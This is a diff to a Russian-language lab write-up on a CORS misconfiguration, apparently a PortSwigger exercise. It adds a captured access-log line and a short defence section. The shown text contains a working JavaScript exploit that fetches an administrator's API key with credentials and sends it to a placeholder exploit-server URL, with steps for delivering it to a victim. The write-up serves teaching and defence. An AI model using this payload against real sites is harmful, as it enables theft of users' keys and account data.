@@ -24,7 +24,7 @@ API-ключ отдаётся эндпоинтом `/accountDetails` (найде
 
 **1.** Пишем эксплойт:
 
-```html
+~~~html
 <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -36,10 +36,19 @@ API-ключ отдаётся эндпоинтом `/accountDetails` (найде
         location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;
     }
 </script>
-```
+~~~
 
 **2.** Вставляем в Body на exploit-сервере → **Store**
 
 **3.** **Deliver exploit to victim**
 
 **4.** Смотрим **Access log** — там API-ключ администратора:
+~~~
+GET /log?key={"username":"administrator",...,"apikey":"<KEY>"}
+~~~
+
+---
+
+## Способы защиты
+
+Настроить ACAO по белому списку доверенных доменов, не отражать `Origin` слепо; не сочетать wildcard/reflection с `Allow-Credentials: true`.
